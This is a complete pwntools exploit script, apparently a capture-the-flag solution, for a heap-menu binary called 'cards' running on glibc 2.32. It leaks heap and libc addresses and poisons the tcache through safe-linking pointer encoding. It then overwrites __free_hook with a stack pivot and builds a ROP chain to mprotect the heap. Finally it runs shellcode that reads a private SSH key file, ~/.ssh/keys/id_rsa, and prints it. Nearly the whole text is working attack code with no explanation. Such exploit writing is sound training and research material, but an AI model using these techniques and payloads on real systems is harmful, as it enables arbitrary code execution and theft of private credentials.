from pwn import *

context(os='linux',arch='amd64')

target = ELF('./cards')
libc   = ELF('./libc-2.32.so', checksec=False)

r = None

main_arena_p336_off = 0x1c4cf0

def add(size, content=""):
    r.sendlineafter('Choice: ', '1')
    r.sendafter('card: ', str(int(size)))
    r.sendafter('color: ', 'blue')
    r.sendafter('name: ', content)

def remove(index):
    r.sendlineafter('Choice: ', '2')
    r.sendafter('card: ', str(index))

def edit(index, content):
    r.sendlineafter('Choice: ', '3')
    r.sendafter('card: ', str(index))
    r.sendafter('name: ', content)

def show(index):
    r.sendlineafter('Choice: ', '4')
    r.sendafter('card: ', str(index))

def trigger_rop(rop):
    r.sendlineafter('Choice: ', '6')
    r.sendafter('name: ', rop)

def PROTECT_PTR(base, addr):
    return (base >> 12) ^ addr

#r = process('./cards', level='debug')
#r = process('./cards')
r = remote('127.0.0.1', 1337)

add(0x28, 'A'*0x28) # 0 
remove(0)

add(0x28, 'A'*(16-2) + 'B'*2) # 1
show(1); r.recvuntil('BB')

leak = u64(r.recvn(6).ljust(8, '\x00'))
log.success('Heap leak: ' + hex(leak))

heap_base  = int(hex(leak)[:11] + '0'*3, 16)
log.success('Heap base: ' + hex(heap_base))

#gdb.attach(r, gdbscript='''c
#x/200gx {0}'''.format(hex(heap_base)))

add(0xd8, 'C'*24) # 2
add(0xd8, 'D'*24) # 3

remove(2)
remove(3)
'''
4x 0x30
2x 0xd8
'''

# Poison tcach->fd with encoded pointer
edit(3, p64(PROTECT_PTR(heap_base, heap_base+0x10)))

add(0xd8, "/home/julio/.ssh/keys/id_rsa\x00") # 4
file_name_addr = heap_base+0x4d0
'''
2x 0x30
1x 0xd8
'''

# This goes to unsorted
add(0xf1, 'E'*8) # 5
'''
0x 0x30
1x 0xd8
'''

# Allocated on top of the heap
add(0xd8, p64(0x0)*3 + p64(0x0000000700000000)) # 6
'''
0x 0x30
0x 0xd8
'''

# Putting chunk 5 inside unsorted chunk
remove(5)
'''
2x 0x30
0x 0x100 - Unsorted
'''

# Zeroing 0x100 tcache count
edit(6, p64(0x0000000000020000) + p64(0x0)*3)

# Allocate on unsorted chunk
add(0x90, "A"*6 + 'CC') # 7

# Leaking <main_arena+336>
show(7); r.recvuntil('CC')

main_arena_p336 = u64(r.recvn(6).ljust(8, '\x00'))
log.success('Leaked <main_arena+336>: ' + hex(main_arena_p336))

libc_base = main_arena_p336-main_arena_p336_off
log.success('Libc base addr: ' + hex(libc_base))

free_hook = libc_base+libc.symbols['__free_hook']
log.success('__free_hook addr: ' + hex(free_hook))

#libc_environ = libc_base + libc.symbols['environ']
#log.success('Libc environ: ' + hex(libc_environ))
#edit(6, p64(0x0000000000000001) + p64(0x0)*15 + p64(libc_environ))

# Gadgets
#add_rsp = 0x000000000004b2f7 # 0x000000000004b2f7: add rsp, 0xd8; ret;
add_rsp = 0x0000000000053145 # 0x0000000000053145: add rsp, 0x38; ret;
pop_rdi = 0x0000000000027b36 # 0x0000000000027b36: pop rdi; ret;
pop_rsi = 0x0000000000032bba # 0x0000000000032bba: pop rsi; ret;
#pop_rdx_pop_r12 = 0x00000000000fc961 # 0x00000000000fc961: pop rdx; pop r12; ret;
pop_rdx = 0x00000000001730c2 # 0x00000000001730c2: pop rdx; add eax, 0x5b050f00; ret;

#gdb.attach(r, gdbscript='''b *{0}
#c'''.format(heap_base+0x5b0))

#gdb.attach(r, gdbscript='''b *{0}
#c'''.format(heap_base+0x5b0))

# Add __free_hook addr to tcache entry (size: 0x20)
edit(6, p64(0x0000000000000001) + p64(0x0)*15 + p64(free_hook))
add(0x18, p64(libc_base+add_rsp)) # 8

mprotect  = p64(libc_base+pop_rdi)
mprotect += p64(heap_base)
mprotect += p64(libc_base+pop_rsi)
mprotect += p64(0x1000)
mprotect += p64(libc_base+pop_rdx)
mprotect += p64(0x7)
mprotect += p64(libc_base+0x00000000000fc0f0)
mprotect += p64(heap_base+0x5b0)

'''
%rdi	%rsi	%rdx
const char __user * filename	int flags	umode_t mode

%rdi	%rsi	%rdx
unsigned int fd	char __user * buf	size_t count

%rdi	%rsi	%rdx
unsigned int fd	const char __user * buf	size_t count
'''

shellcode = asm("""
    xor rax, rax
    mov rax, 0x2
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, {0}
    syscall
    mov r10, rax
    xor rax, rax
    mov rdi, r10
    mov rsi, {1}
    mov rdx, 0xa8c
    syscall
    mov rax, 0x1
    mov rdi, 0x1
    syscall
    mov rax, 0x3c
    mov rdi, 0x1337
    syscall
""".format(heap_base+0x4d0, heap_base+0x710))

edit(7, shellcode)

trigger_rop(mprotect)

remove(4)

log.success('Reading ~/.ssh/keys/id_rsa')
print(r.recv())

r.close()
